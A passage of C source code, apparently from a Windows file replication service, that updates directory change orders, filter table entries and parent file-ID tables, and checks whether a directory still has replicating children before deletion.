            FRS_ASSERT(OrigParentFilterEntry != NULL);
            FEList[FEx++] = OrigParentFilterEntry;
        }
    } else {
        //
        // Not the root so update using current name/parent of FilterEntry.
        //
        FEList[FEx++] = FilterEntry;
    }

    //
    // Apply the name space table updates.
    //
    while (FEx != 0) {
        FE = FEList[--FEx];
        JrnlUpdateNst(pVme, &FE->UFileName, &FE->DParentFileID, StreamSeqNum);
    }

    //
    // Update or install the change order.
    //
    WStatus = JrnlUpdateChangeOrder(ChangeOrder,
                                    Cop->NewReplica,
                                    Cop->NewParentFid,
                                    Cop->NewLocationCmd,
                                    (Root ? UsnRecord : NULL));

    //
    // Update the filter entry if necessary.
    //

    //
    // See if the filename part is different and, if so, copy it.
    // Only applies to the Root entry of the subtree.
    // Limit it to MAX_PATH characters.
    //
    if (Root) {
        if (UsnRecord->FileNameLength > 2*MAX_PATH) {
            UsnRecord->FileNameLength = 2*MAX_PATH;
        }
        FrsAllocUnicodeString(&FilterEntry->UFileName,
                              FilterEntry->DFileName,
                              UsnRecord->FileName,
                              UsnRecord->FileNameLength);
    }

    switch (Cop->NewLocationCmd) {

    case CO_LOCATION_CREATE:
    case CO_LOCATION_MOVEIN:
    case CO_LOCATION_MOVEIN2:
    case CO_LOCATION_NO_CMD:
        //
        // On creates and movein the caller has created the filter table
        // entry already (to pass it to this fcn).
        //
        GhtDereferenceEntryByAddress(FilterTable, FilterEntry, TRUE);
        break;

    case CO_LOCATION_DELETE:
    case CO_LOCATION_MOVEOUT:
        //
        // Now delete the entry from the Filter Table.  If this is the root
        // then first drop the ref count by one to compensate for the first
        // lookup in JrnlFilterUpdate() where all this started.
        // The second ref was taken through the Enumerate list function.
        //
        if (Root) {
            GhtDereferenceEntryByAddress(FilterTable, FilterEntry, TRUE);
        }

        WStatus = JrnlDeleteDirFilterEntry(FilterTable, NULL, FilterEntry);
        if (!WIN_SUCCESS(WStatus)) {
            DPRINT(0, "++ ERROR - Dir entry delete failed.\n");
        }
        break;


    case CO_LOCATION_MOVERS:
        //
        // Replica set changed.  Update the filter entry.
        //
        FilterEntry->Replica = Cop->NewReplica;
        FilterEntry->DReplicaNumber = Cop->NewReplica->ReplicaNumber;

        /* FALL THRU INTENDED */

    case CO_LOCATION_MOVEDIR:
        //
        // Directory changed.  Applies to root on both MOVEDIR and MOVERS.
        // Update the parent file ID in the filter entry and
        // Put the filter entry on the childlist of the new parent.
        //
        if (Root) {
            FilterEntry->DParentFileID = UsnRecord->ParentFileReferenceNumber;

            if (FilterEntry->ChildEntry.Flink == NULL) {
                DPRINT(0, "++ ERROR - Dir entry not on child list\n");
                FRS_JOURNAL_FILTER_PRINT(0, FilterTable, FilterEntry);
                FRS_ASSERT(!"Dir entry not on child list");
            }

            FrsRemoveEntryList(&FilterEntry->ChildEntry);
            FilterEntry->ChildEntry.Flink = NULL;

            WStatus1 = (ULONG)JrnlFilterLinkChild(FilterTable,
                                                  FilterEntry,
                                                  FilterEntry->Replica);
            if (!WIN_SUCCESS(WStatus1)) {
                DPRINT(0, "++ ERROR - JrnlFilterLinkChild Failed\n");
                FRS_JOURNAL_FILTER_PRINT(0, FilterTable, FilterEntry);
                FRS_ASSERT(!"JrnlFilterLinkChild Failed");
            }
        }
        GhtDereferenceEntryByAddress(FilterTable, FilterEntry, TRUE);
        break;


    default:
        DPRINT1(0, "++ Error - switch arg out of range: %d\n", Cop->NewLocationCmd);
        FRS_ASSERT(!"NewLocationCmd invalid");
        GhtDereferenceEntryByAddress(FilterTable, FilterEntry, TRUE);
    }

    //
    // Return the change order status.
    //
    return WStatus;

}


ULONG
JrnlUpdateChangeOrder(
    IN PCHANGE_ORDER_ENTRY ChangeOrder,
    IN PREPLICA            NewReplica,
    IN ULONGLONG           NewParentFid,
    IN ULONG               NewLocationCmd,
    IN PUSN_RECORD         UsnRecord
    )
/*++

Routine Description:

    This function updates an existing directory change order that is still
    pending in the Replica's change order process list or inserts a new change
    order that has been prepared as described below.

    There are two components to a change order, content and file location.
    A given USN record could have changes to both parts.

    The content component is updated by merging the reason flags from the
    UsnRecord and capturing relevant parameters such as the attributes and
    FileName.

    The location update component is more complicated and uses a state table,
    ChangeOrderLocationStateTable[], to manage the update.  The state table
    determines when we update the parent directory or the replica set in the
    change order.  This occurs when a directory is renamed.  The states in
    the table also correspond to the change order location command to be used.

    The change order may move from one replica set to another.  This routine
    assumes that the caller has acquired the change order process list locks
    for both the source and dest replicas.  This is the only case where we can
    pull it off the list because there could be a dependent entry that follows
    it in the change order list and an error could result if the update
    process saw the dependent entry first.  (Probably only an issue for
    directory creates).

    The Source Change order process list lock is needed for all Location Commands.
    The Destination Change order process list lock is needed for:
        CO_LOCATION_MOVEIN, CO_LOCATION_MOVERS commands.


    The change order may be evaporated in certain cases.  If not this routine
    decrements the reference count on the change order before it returns.

    This routine can be called with a new change order but the caller must
    pre-init the change order correctly:
        1.  Bump the initial ref count by 1 (since that is what lookup does).
        2.  The command flag CO_FLAG_ONLIST should be clear so we don't try
            to pull it off a list.
        3.  The length field in the unicode string UFileName must be 0 to
            capture the file name.
        4.  Set New and orig Replica fields to the original replica.
        5.  Set New and orig parent FID fields to the original parent FID.
        6.  The command flag CO_FLAG_LOCATION_CMD should be clear.
        7.  The FileReferenceNumber must be set to the file ID of the file/dir.
            The File Id is the index into the change order table.

    This routine also updates the parent file ID table so the parent File ID
    tracks on renames and the entry is deleted if the change order is
    evaporated or the new location command specifies delete.

Arguments:

    ChangeOrder - The existing change order to be updated.
    NewReplica - The destination replica the directory is renamed into.
    NewparentFid - The destination parent the directory is renamed into.
    NewLocationCmd - The new location command applied to the directory.
    UsnRecord - The NTFS USN record describing the change.  When walking a
                through a sub-tree this will be NULL for all directories
                except for the root.

Return Value:

    Win32 status.

--*/

{
#undef DEBSUB
#define DEBSUB  "JrnlUpdateChangeOrder:"

    PREPLICA Replica;
    ULONG Control;
    ULONG Op;
    ULONG PreviousState;
    ULONG Reason = 0;
    BOOL EvapFlag = FALSE;
    ULONG GStatus;
    ULONG NewState;
    PVOLUME_MONITOR_ENTRY pVme;
    BOOL SubTreeRoot;
    ULONG WStatus;
    BOOL CoUpdate;
    PCHANGE_ORDER_ENTRY NewParentCo;
    ULONG LocationCmd;

    //
    // Only update parent file IDs on the sub tree root.  This is the dir
    // that the USN Record was generated for in the dir rename.
    // For any subordinate dirs the caller must supply NULL.
    // If a changeorder comes in already on the process list then it must
    // be an update.
    //
    SubTreeRoot = (UsnRecord != NULL);
    CoUpdate = CO_FLAG_ON(ChangeOrder, CO_FLAG_ONLIST);

    //
    // If a USN record is supplied then check for any content flags set in the
    // USN reason mask.  If so then set the content flag in the change order.
    // When walking a subtree the USN Record is non-null only for the root since
    // the content changes don't apply to the children.
    //
    if (SubTreeRoot) {
        Reason = UsnRecord->Reason;
        if (Reason & CO_CONTENT_MASK) {
            SET_CO_FLAG(ChangeOrder, CO_FLAG_CONTENT_CMD);

            //
            // Update the content portion of the change order.  Merge in the
            // reason mask from the Usn Record.
            //
            ChangeOrder->Cmd.ContentCmd |= Reason;
        }
        //
        // Capture the name in the case of rename, create and delete.
        // Limit it to MAX_PATH characters.
        //
        // if ((Reason & CO_LOCATION_MASK) || (ChangeOrder->UFileName.Length == 0)) {
        if ((Reason & USN_REASON_RENAME_NEW_NAME) ||
            (ChangeOrder->UFileName.Length == 0)) {
            if (UsnRecord->FileNameLength > 2*MAX_PATH) {
                UsnRecord->FileNameLength = 2*MAX_PATH;
            }
            FrsAllocUnicodeString(&ChangeOrder->UFileName,
                                  ChangeOrder->Cmd.FileName,
                                  UsnRecord->FileName,
                                  UsnRecord->FileNameLength);
            ChangeOrder->Cmd.FileNameLength = UsnRecord->FileNameLength;
        }

        //
        // Capture most recent file attributes.
        // In the case where we are updating a pending CO,
        // we would miss a series of ops on the same file such as
        // set the hidden bit, close, delete the system bit, close, ...
        //
        ChangeOrder->Cmd.FileAttributes = UsnRecord->FileAttributes;
        //
        // Update to the latest USN contributing to this change order.
        //
        ChangeOrder->Cmd.JrnlUsn = UsnRecord->Usn;
    }

    //
    // Check if there is a new location command.  If not go insert the change order.
    //
    if (NewLocationCmd == CO_LOCATION_NO_CMD) {
        goto INSERT_CHANGE_ORDER;
    }

    //
    // Update the parent file ID table based on the new location command.
    //
    if (CO_NEW_FILE(NewLocationCmd)) {
        //
        // Add a new entry for the new file in the R.S.
        //
        ChangeOrder->ParentFileReferenceNumber = NewParentFid;
        GStatus = QHashInsert(NewReplica->pVme->ParentFidTable,
                              &ChangeOrder->FileReferenceNumber,
                              &NewParentFid,
                              NewReplica->ReplicaNumber,
                              FALSE);
        if (GStatus != GHT_STATUS_SUCCESS ) {
            DPRINT1(0, "++ QHashInsert error: %d\n", GStatus);
        }
    } else
    if ((NewLocationCmd == CO_LOCATION_DELETE) ||
        (NewLocationCmd == CO_LOCATION_MOVEOUT)) {
        //
        // File is gone.  Remove the entry.
        //
        GStatus = QHashDelete(NewReplica->pVme->ParentFidTable,
                              &ChangeOrder->FileReferenceNumber);
        if (GStatus != GHT_STATUS_SUCCESS ) {
            DPRINT1(0, "++ QHashDelete error: %d\n", GStatus);
        }
    } else
    if (CO_MOVE_RS_OR_DIR(NewLocationCmd)) {
        //
        // File changed parents.  Update the entry for subtree root only.
        //
        if (SubTreeRoot) {
            ChangeOrder->ParentFileReferenceNumber = NewParentFid;
            GStatus = QHashUpdate(NewReplica->pVme->ParentFidTable,
                                  &ChangeOrder->FileReferenceNumber,
                                  &NewParentFid,
                                  0);
            if (GStatus != GHT_STATUS_SUCCESS ) {
                DPRINT1(0, "++ QHashUpdate error: %d\n", GStatus);
            }
        }
    } else {
        DPRINT1(0, "++ ERROR - Invalid new location command: %d\n", NewLocationCmd);
    }



    //
    // Update the location component of the change order.  Fetch the Control
    // DWORD from the table based on the pending command and the new command
    // then perform the specified operation sequence.  If the pending change
    // order was for a content change then there is no prior location command.
    // Check for this.
    //
    // Caller has acquired change order process lock for both current and
    // new Replica Sets as appropriate.
    //

    if (CO_FLAG_ON(ChangeOrder, CO_FLAG_LOCATION_CMD)) {
        PreviousState = GET_CO_LOCATION_CMD(ChangeOrder->Cmd, Command);
    } else {
        PreviousState = NSNoLocationCmd;
        SET_CO_FLAG(ChangeOrder, CO_FLAG_LOCATION_CMD);
    }

    Control = ChangeOrderLocationStateTable[PreviousState][NewLocationCmd].u1.UlongOpFields;

    DPRINT5(5,"++ Old state: %s (%d), Input cmd: %s (%d), Ctl Wd: %08x\n",
            CoLocationNames[PreviousState],  PreviousState,
            CoLocationNames[NewLocationCmd], NewLocationCmd,
            Control);

    if (Control == 0) {
        DPRINT2(0, "++ ERROR - Invalid transition.  Pending: %d   New: %d\n",
                PreviousState, NewLocationCmd);
        FRS_ASSERT(!"Invalid CO Location cmd transition-1");
        goto ERROR_RETURN;
    }

    while (Control != 0) {
        Op = Control & 0x0000000F;
        Control = Control >> 4;

        switch (Op) {


        //
        // Done.
        //
        case  OpInval:
            DPRINT5(0,"++ Error - Invalid state transition - Old state: %s (%d), Input cmd: %s (%d), Ctl Wd: %08x\n",
                    CoLocationNames[PreviousState],  PreviousState,
                    CoLocationNames[NewLocationCmd], NewLocationCmd,
                    Control);
            FRS_ASSERT(!"Invalid CO Location cmd transition-2");
            Control = 0;
            break;


        //
        // Evaporate the pending change order.  It should be on the process
        // list associated with the NewReplica.  THis should never happen
        // if the previous state is NSNoLocationCmd.
        //
        case  OpEvap:

            //
            // Increment the CO Evaporated Counter
            //
            PM_INC_CTR_REPSET(NewReplica, COEvaporated, 1);

            DPRINT(5, "++ OpEvap\n");
            pVme = ChangeOrder->NewReplica->pVme;

            FRS_ASSERT(PreviousState != NSNoLocationCmd);
            FRS_ASSERT(!IsListEmpty(&ChangeOrder->ProcessList));

            FrsRtlRemoveEntryQueueLock(&pVme->ChangeOrderList,
                                      &ChangeOrder->ProcessList);
            DECREMENT_CHANGE_ORDER_REF_COUNT(ChangeOrder);
            DROP_CO_CXTION_COUNT(ChangeOrder->NewReplica, ChangeOrder, ERROR_SUCCESS);

            CHANGE_ORDER_TRACE(3, ChangeOrder, "Local Co OpEvap");

            DEC_LOCAL_CO_QUEUE_COUNT(ChangeOrder->NewReplica);
            //
            // Delete the entry from the Change Order Table.  It should be in
            // the Change order table assoicated with NewReplica.  The ref
            // count should be 2 since the caller did a lookup.
            //
            FRS_ASSERT(ChangeOrder->HashEntryHeader.ReferenceCount == 2);

            GStatus = GhtDeleteEntryByAddress(pVme->ChangeOrderTable,
                                              ChangeOrder,
                                              TRUE);
            if (GStatus != GHT_STATUS_SUCCESS) {
                DPRINT(0, "++ ERROR - GhtDeleteEntryByAddress failed.\n");
                FRS_PRINT_TYPE(0, ChangeOrder);
                FRS_ASSERT(!"JrnlUpdateCO: CO Table GhtDeleteEntryByAddress failed");
                goto ERROR_RETURN;
            }
            EvapFlag = TRUE;
            break;



        //
        // Update the New Replica Set
        //
        case  OpNRs:

            DPRINT(5, "++ OpNRs\n");
            //
            // Update the parent dir on the subtree root and the replica ID
            // on all change orders.
            //
            ChangeOrder->NewReplica = NewReplica;

            /* FALL THRU INTENDED */

        //
        // Update the New Parent Directory on the subtree root only.
        //
        case  OpNDir:

            if (Op == OpNDir) {DPRINT(5, "++ OpNDir\n");}

            if (SubTreeRoot) {
                ChangeOrder->NewParentFid = NewParentFid;

                if (CoUpdate) {
                    //
                    // See if there is a pending change order on the new parent.
                    // If there is and it is a create that happens after this
                    // change order then move this updated CO to the end of the
                    // list so the Parent Create is done first.  We do this by
                    // removing it from the list and letting the insert code put
                    // it back on at the end with a new VSN.
                    //
                    pVme = ChangeOrder->NewReplica->pVme;
                    GStatus = GhtLookup(pVme->ChangeOrderTable,
                                        &NewParentFid,
                                        TRUE,
                                        &NewParentCo);

                    if ((GStatus == GHT_STATUS_SUCCESS) &&
                        (NewParentCo->Cmd.FrsVsn > ChangeOrder->Cmd.FrsVsn)){

                        FRS_ASSERT(!IsListEmpty(&ChangeOrder->ProcessList));
                        FrsRtlRemoveEntryQueueLock(&pVme->ChangeOrderList,
                                                  &ChangeOrder->ProcessList);
                        DECREMENT_CHANGE_ORDER_REF_COUNT(ChangeOrder);
                        DROP_CO_CXTION_COUNT(ChangeOrder->NewReplica,
                                             ChangeOrder,
                                             ERROR_SUCCESS);
                        CLEAR_CO_FLAG(ChangeOrder, CO_FLAG_ONLIST);
                        CHANGE_ORDER_TRACE(3, ChangeOrder, "Local Co OpNDir");
                        DEC_LOCAL_CO_QUEUE_COUNT(ChangeOrder->NewReplica);
                        GhtDereferenceEntryByAddress(pVme->ChangeOrderTable,
                                                     NewParentCo,
                                                     TRUE);
                    }
                }
            }

            break;


        //
        // Update the State / Command.
        //
        case  OpNSt:

            NewState = Control & 0x0000000F;
            DPRINT2(5, "++ OpNst: %s (%d)\n", CoLocationNames[NewState], NewState);
            SET_CO_LOCATION_CMD(ChangeOrder->Cmd, Command, NewState);
            Control = Control >> 4;

            break;


        //
        // The table is messed up.
        //
        default:
            DPRINT1(0, "++ Error - Invalid dispatch operation: %d\n", Op);
            FRS_ASSERT(!"Invalid CO dispatch operation");
            goto ERROR_RETURN;
        }
    }

INSERT_CHANGE_ORDER:
    //
    // If the change order hasn't been deleted then decrement the ref count
    // to balance the Caller's lookup.  If the change order is not on a process
    // list because it is new or it switched replica sets then put it on the
    // target list.
    //
    WStatus = ERROR_SUCCESS;
    if (!EvapFlag) {

        Replica = ChangeOrder->NewReplica;
        pVme = Replica->pVme;

        if (!CO_FLAG_ON(ChangeOrder, CO_FLAG_ONLIST)) {

            //
            // No reason to age deletes
            //
            if (CO_FLAG_ON(ChangeOrder, CO_FLAG_LOCATION_CMD) &&
               (GET_CO_LOCATION_CMD(ChangeOrder->Cmd, Command) == CO_LOCATION_DELETE)) {
                ChangeOrder->TimeToRun = CO_TIME_NOW(pVme);
            } else {
                ChangeOrder->TimeToRun = CO_TIME_TO_RUN(pVme);
            }

            //
            // Generate a new Volume Sequnce Number for the change order since
            // it gets sent to the end of the new R.S. process list.
            // The change order VSNs must be kept monotonically increasing
            // within a replica set for change order dampening to work.
            //
            NEW_VSN(pVme, &ChangeOrder->Cmd.FrsVsn);
            SET_CO_FLAG(ChangeOrder, CO_FLAG_LOCALCO);

            //
            // Entry already in Aging table if its a CO update.  If this is a
            // duplicate entry for the same FID (because the merge was
            // disallowed then put this entry at the end of the duplicate list.
            //
            if (!CoUpdate) {
                CHANGE_ORDER_TRACEX(3, ChangeOrder, "Local Co Q Insert",
                                    ChangeOrder->Cmd.ContentCmd);
                GStatus = GhtInsert(pVme->ChangeOrderTable, ChangeOrder, TRUE, TRUE);
                if (GStatus != GHT_STATUS_SUCCESS) {
                    DPRINT1(0, "++ ERROR - GhtInsert Failed: %d\n", GStatus);
                    FRS_ASSERT(!"Local Co Q Insert Failed");
                    goto ERROR_RETURN;
                }
                SET_COE_FLAG(ChangeOrder, COE_FLAG_IN_AGING_CACHE);
            } else {
                CHANGE_ORDER_TRACEX(3, ChangeOrder, "Local Co Aging Update",
                                    ChangeOrder->Cmd.ContentCmd);
            }

            INCREMENT_CHANGE_ORDER_REF_COUNT(ChangeOrder);

            //
            // For remote COs the cxtion count is incremented when the remote CO
            // goes onto the CO process queue.  We don't do this for local COs
            // because the code to shutdown the Jrnl Cxtion may never see the
            // CO count go to zero if we did this.  We just set the CO
            // CxtionGuid and the CO JoinGuid here so unjoin / rejoins can be
            // detected.
            //
            INIT_LOCALCO_CXTION_GUID(Replica, ChangeOrder);

            WStatus = FrsRtlInsertTailQueueLock(&pVme->ChangeOrderList,
                                                &ChangeOrder->ProcessList);
            if (WIN_SUCCESS(WStatus)) {
                SET_CO_FLAG(ChangeOrder, CO_FLAG_ONLIST);
                INC_LOCAL_CO_QUEUE_COUNT(Replica);
            } else {
                DPRINT_WS(0, "++ ERROR - ChangeOrder insert failed:", WStatus);
            }

        }

        GStatus = GhtDereferenceEntryByAddress(pVme->ChangeOrderTable,
                                               ChangeOrder,
                                               TRUE);
        if (GStatus != GHT_STATUS_SUCCESS) {
            DPRINT(0, "++ ERROR: GhtDereferenceEntryByAddress ref count non positive.\n");
            FRS_PRINT_TYPE(0, ChangeOrder);
            FRS_ASSERT(!"CO ref count non positive");
            goto ERROR_RETURN;
        }
    }

    return WStatus;


ERROR_RETURN:

    return ERROR_GEN_FAILURE;
}


ULONG
JrnlDoesChangeOrderHaveChildrenWorker(
    IN PQHASH_TABLE ParentFidTable,
    IN PQHASH_ENTRY BeforeNode,
    IN PQHASH_ENTRY TargetNode,
    IN PVALID_CHILD_CHECK_DATA   pValidChildCheckData
    )
/*++

Routine Description:

    This function is called thru QHashEnumerateTable().

    Search for a match between the ParentFid and the entry's
    ParentFid (QHASH_ENTRY.QData).

Arguments:

    Table       -- the hash table being enumerated
    BeforeNode  -- ptr to the QhashEntry before the node of interest.
    TargetNode  -- ptr to the QhashEntry of interest.
    pValidChildCheckData -- ptr to the parent fid

Return Value:

    FrsErrorResourceInUse   - Child of ParentFid was found
    FrsErrorSuccess         - No children were found for ParentFid

--*/
{
#undef DEBSUB
#define DEBSUB  "JrnlDoesChangeOrderHaveChildrenWorker:"

    JET_ERR              jerr;
    PTHREAD_CTX          ThreadCtx = pValidChildCheckData->ThreadCtx;
    PTABLE_CTX           TmpIDTableCtx = pValidChildCheckData->TmpIDTableCtx;
    PIDTABLE_RECORD      IDTableRec;

    if ((TargetNode->QData == pValidChildCheckData->FileReferenceNumber)){

        if (ThreadCtx == NULL || TmpIDTableCtx == NULL) {
            return FrsErrorResourceInUse;
        }

        jerr = DbsReadRecord(ThreadCtx, &TargetNode->QKey, FileIDIndexx, TmpIDTableCtx);

        //
        // No IDTable entry. OK to delete the child.
        //
        if (jerr == JET_errRecordNotFound) {
            return FrsErrorSuccess;
        }

        if (!JET_SUCCESS(jerr)) {
            DPRINT_JS(0,"++ ERROR - DbsReadRecord failed;", jerr);
            return FrsErrorResourceInUse;
        }

        IDTableRec = (PIDTABLE_RECORD) (TmpIDTableCtx->pDataRecord);

        //
        // This child of the parent is not marked to be deleted which means it is
        // not going away. Hence return that this parent has children. The parent
        // delete will be aborted.
        //
        if (!IsIdRecFlagSet(IDTableRec, IDREC_FLAGS_DELETE_DEFERRED)) {
            return FrsErrorResourceInUse;
        }

    }
    return FrsErrorSuccess;
}


BOOL
JrnlDoesChangeOrderHaveChildren(
    IN PTHREAD_CTX          ThreadCtx,
    IN PTABLE_CTX           TmpIDTableCtx,
    IN PCHANGE_ORDER_ENTRY  ChangeOrder
    )
/*++

Routine Description:

    The ChangeOrderAccept thread is issueing a retry of a directory
    delete. The question is, "Does this directory have replicating
    children?" If so, the change order should be retried at a later
    time.

    If not, the change order is sent on to an install thread that
    will empty the directory of any files or subdirectories and
    then delete the directory. The files and subdirectories are
    assumed to have been filtered and are non-replicating. You can
    see why we want to insure there are no replicating files or
    subdirectories in this directory prior to emptying the directory.

    The journal's directory filter table and the journal's parent fid
    table are searched for children of the directory specified by
    ChangeOrder.

Arguments:

    ChangeOrder - For a retry of a directory delete

Return Value:

    TRUE    - Directory has replicating children in the journal tables
    FALSE   - Directory does not have replicating children in the journal tables

--*/
{
#undef DEBSUB
#define DEBSUB  "JrnlDoesChangeOrderHaveChildren:"
    DWORD                   FStatus;
    PREPLICA                Replica;
    PVOLUME_MONITOR_ENTRY   pVme;
    PQHASH_TABLE            ParentFidTable;
    VALID_CHILD_CHECK_DATA  ValidChildCheckData;

    Replica = ChangeOrder->NewReplica;

    //
    // Retry the change order if information about its children is lacking.
    //
    if (!Replica) {
        DPRINT(4, "++ WARN: No Replica in ChangeOrder\n");
        return TRUE;
    }
    pVme = Replica->pVme;
    if (!pVme) {
        DPRINT(4, "++ WARN: No pVme in Replica\n");
        return TRUE;
    }
    ParentFidTable = pVme->ParentFidTable;
    if (!ParentFidTable) {
        DPRINT(4, "++ WARN: No ParentFidTable in pVme\n");
        return TRUE;
    }

    //
    // Look for subdirectories and files.
    //
    ValidChildCheckData.ThreadCtx = ThreadCtx;
    ValidChildCheckData.TmpIDTableCtx = TmpIDTableCtx;
    ValidChildCheckData.FileReferenceNumber = ChangeOrder->FileReferenceNumber;

    FStatus = QHashEnumerateTable(ParentFidTable,
                                  JrnlDoesChangeOrderHaveChildrenWorker,
                                  &ValidChildCheckData);
    if (FStatus == FrsErrorResourceInUse) {
        DPRINT(4, "++ Child found; change order has files\n");
        return TRUE;
    }
    DPRINT(4, "++ Child not found; change order has no subdirs or files\n");
    return FALSE;
}


ULONG
JrnlAddFilterEntryFromUsn(
    IN PREPLICA              Replica,
    IN PUSN_RECORD           UsnRecord,
    OUT PFILTER_TABLE_ENTRY *RetFilterEntry
    )
/*++

Routine Description:

    Create a new filter table entry from data in the USN record and the
    Replica struct.   Insert it into the Volume Filter Table.

    The caller must decrement the refcount on the filter entry.

Arguments:

    Replica - ptr to the Replica struct containing the directory now.
    UsnRecord - ptr to the UsnRecord.
    RetFilterEntry - ptr to returned filter table ptr.  NULL if caller doesn't
                     want a reference to the entry so we drop it here.

Return Value:

    Win32 status.

--*/
{
#undef DEBSUB
#define DEBSUB  "JrnlAddFilterEntryFromUsn:"

    PFILTER_TABLE_ENTRY  FilterEntry;
    ULONG Len;
    ULONG WStatus;

    //
    // Create a new filter entry.
    // The size of the file name field is Len + sizeof(WCHAR) because
    // the file name field is defined as a wchar array of length 1.
    //
    Len = UsnRecord->FileNameLength;
    FilterEntry = FrsAllocTypeSize(FILTER_TABLE_ENTRY_TYPE, Len);

    FilterEntry->DFileID = UsnRecord->FileReferenceNumber;
    FilterEntry->DParentFileID = UsnRecord->ParentFileReferenceNumber;

    FrsCopyUnicodeStringFromRawString(&FilterEntry->UFileName,
                                      Len + sizeof(WCHAR),
                                      UsnRecord->FileName,
                                      Len);

    WStatus = JrnlAddFilterEntry(Replica, FilterEntry, RetFilterEntry, TRUE);

    if (!WIN_SUCCESS(WStatus)) {
        DUMP_USN_RECORD2(0, UsnRecord, Replica->ReplicaNumber, CO_LOCATION_NUM_CMD);
    }
    return WStatus;
}


ULONG
JrnlAddFilterEntryFromCo(
    IN PREPLICA Replica,
    IN PCHANGE_ORDER_ENTRY  ChangeOrder,
    OUT PFILTER_TABLE_ENTRY  *RetFilterEntry
    )
/*++

Routine Description:

    Create a new filter table entry from data in the change order entry and the
    Replica struct.   Insert it into the Volume Filter Table.  This is called
    when we receive remote change orders that create a directory.

    If this is a recovery change order than the filter entry is replaced if
    there is a conflict.

    The caller must decrement the refcount on the filter entry.

Arguments:

    Replica - ptr to the Replica struct containing the directory now.
    ChangeOrder -- ptr to the change order entry.
    RetFilterEntry - ptr to returned filter table ptr.  NULL if caller doesn't
                     want a reference to the entry so we drop it here.

Return Value:

    Win32 status.

--*/
{
#undef DEBSUB
#define DEBSUB  "JrnlAddFilterEntryFromCo:"

    PFILTER_TABLE_ENTRY  FilterEntry;
    ULONG Len;
    ULONG WStatus;

    //
    // Create a new filter entry.
    // NOTE that the actual size of the filename buffer is Len +
    // sizeof(WCHAR) because the definition of FILTER_TABLE_ENTRY
    // includes a single wchar array for filename. Hence, the
    // assignment of UNICODE_NULL to Buffer[Len/2] doesn't scribble
    // past the end of the array.
    //
    Len = ChangeOrder->Cmd.FileNameLength;
    FilterEntry = FrsAllocTypeSize(FILTER_TABLE_ENTRY_TYPE, Len);

    FilterEntry->DFileID = ChangeOrder->FileReferenceNumber;
    FilterEntry->DParentFileID = ChangeOrder->ParentFileReferenceNumber;

    FilterEntry->UFileName.Length = (USHORT)Len;
    CopyMemory(FilterEntry->UFileName.Buffer, ChangeOrder->Cmd.FileName, Len);
    FilterEntry->UFileName.Buffer[Len/2] = UNICODE_NULL;

    //
    // Its possible to receive a change order more than once; and the
    // first change order may have been taken through retry. If the
    // change order was for a directory create, this would leave
    // an idtable entry set to IDREC_FLAGS_NEW_FILE_IN_PROGRESS
    // *and* the directories entries in the filter table. So, always
    // relace an existing entry.
    //
    return JrnlAddFilterEntry(Replica, FilterEntry, RetFilterEntry, TRUE);

}


ULONG
JrnlAddFilterEntry(
    IN  PREPLICA Replica,
    IN  PFILTER_TABLE_ENTRY  FilterEntry,
    OUT PFILTER_TABLE_ENTRY  *RetFilterEntry,
    IN  BOOL Replace
    )
/*++

Routine Description:

    Insert the filter entry into the Volume Filter Table.
    This routine acquires the child list lock for the replica when doing the
    child list insert.

    The caller must decrement the refcount on the filter entry.

    On an insert error the entry is freed and NULL is returned.

Arguments:

    Replica - ptr to the Replica struct containing the directory now.
    FilterEntry -- ptr to filter entry to insert.
    RetFilterEntry - ptr to returned filter table ptr.  NULL if caller doesn't
                     want a reference to the entry so we drop it here.
                     On an insert error the entry is freed and NULL is returned.
    Replace - If true then replace current entry with this one if conflict.

Return Value:

    Win32 status.

--*/
{
#undef DEBSUB
#define DEBSUB  "JrnlAddFilterEntry:"

    PGENERIC_HASH_TABLE FilterTable = Replica->pVme->FilterTable;
    ULONG GStatus, WStatus=ERROR_GEN_FAILURE;
    ULONG RetryCount = 0;
    PFILTER_TABLE_ENTRY  OldEntry;
    ULONG Len;

    //
    // Start ref count out at one (insert bumps it again to 2) if we
    // return the address of the entry.
    //
    FilterEntry->HashEntryHeader.ReferenceCount = 1;
    FilterEntry->Replica = Replica;
    FilterEntry->DReplicaNumber = Replica->ReplicaNumber;

RETRY:
    //
    // Insert the entry into the VME Filter Table.
    //
    GStatus = GhtInsert(FilterTable, FilterEntry, TRUE, FALSE);
    if (GStatus != GHT_STATUS_SUCCESS) {
        if (Replace) {
            goto REPLACE;
        }
        DPRINT1(0, "++ ERROR - GhtInsert Failed: %d, Entry conflict.  Tried to insert:\n", GStatus);
        FRS_JOURNAL_FILTER_PRINT(0, FilterTable, FilterEntry);
        FilterEntry = FrsFreeType(FilterEntry);
        //
        // Don't know how to translate GStatus to WStatus. The return value is ignored
        // anyways.
        //
        WStatus = ERROR_GEN_FAILURE;
        goto ERROR_RETURN;
    }

    //
    // Link the filter entry onto the parent's child list and drop the reference
    // if the caller doesn't want the ptr back.
    //
    JrnlAcquireChildLock(Replica);
    WStatus = (ULONG)JrnlFilterLinkChild(FilterTable, FilterEntry, Replica);
    JrnlReleaseChildLock(Replica);

    if (!WIN_SUCCESS(WStatus)) {
        DPRINT(0, "++ ERROR - Failed to put filter entry on Child List\n");
        FRS_JOURNAL_FILTER_PRINT(0, FilterTable, FilterEntry);
        //
        // Need some code here to add this filter entry to an orphan list
        // in the off chance that the parent will later come into existence
        // and now needs to hook up to the child.  The creation of each new
        // entry would then have to scan the orphan list if it was non-empty.
        // Note that because of ordering constraints I don't think this
        // can actually happen except in the case of a remote co dir create
        // while a local co moveout is in process.  But in this case when
        // the child dir is found during the enum it will end up getting
        // deleted.
        // If we relax the ordering constraints on dir creates (since they
        // all start out being created in the pre-install area anyway) then
        // this code will definitely be needed.
        //
        // Note: May need dir filter entry orphan list.  see note above.
    }


RETURN:

    if (RetFilterEntry != NULL) {
        *RetFilterEntry = FilterEntry;
    } else {
        GhtDereferenceEntryByAddress(FilterTable, FilterEntry, TRUE);
    }

    return WStatus;


REPLACE:
    //
    // Replace the data in the old entry with the data in the new entry.
    //
    GStatus = GhtLookup(FilterTable, &FilterEntry->DFileID, TRUE, &OldEntry);
    if (GStatus != GHT_STATUS_SUCCESS) {
        FRS_ASSERT(RetryCount++ > 10);
        goto RETRY;
    }

    FRS_ASSERT(OldEntry->DFileID == FilterEntry->DFileID);
    //
    // Undoing a MOVERS for a dir is going to be a pain.
    // Need to check if it can really happen.  Could we just abort this CO?
    //
    FRS_ASSERT(OldEntry->Replica == FilterEntry->Replica);
    FRS_ASSERT(OldEntry->DReplicaNumber == FilterEntry->DReplicaNumber);


